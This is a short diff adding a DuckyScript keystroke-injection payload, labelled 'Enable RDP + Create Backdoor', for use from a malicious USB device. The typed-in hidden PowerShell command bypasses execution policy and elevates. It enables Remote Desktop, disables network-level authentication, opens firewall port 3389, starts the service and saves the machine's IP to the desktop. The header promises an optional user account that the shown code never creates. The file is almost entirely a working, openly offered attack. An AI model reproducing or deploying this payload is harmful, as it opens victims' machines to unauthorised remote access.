@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | Enable RDP + Create Backdoor
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: LOW
+REM  Enables RDP, opens firewall, optional user
+REM  Requires: Admin
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"reg add \\\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;reg add \\\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\\\" /v UserAuthentication /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\\\"Remote Desktop\\\" dir=in action=allow protocol=tcp localport=3389;net start TermService;$ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne \\\"127.0.0.1\\\"}|select -f 1).IPAddress;\\\"RDP enabled on $ip`:3389\\\"|Out-File ([Environment]::GetFolderPath(\\\"Desktop\\\")+\\\"\rdp_enabled.txt\\\")\"'"
+ENTER
+DELAY 500
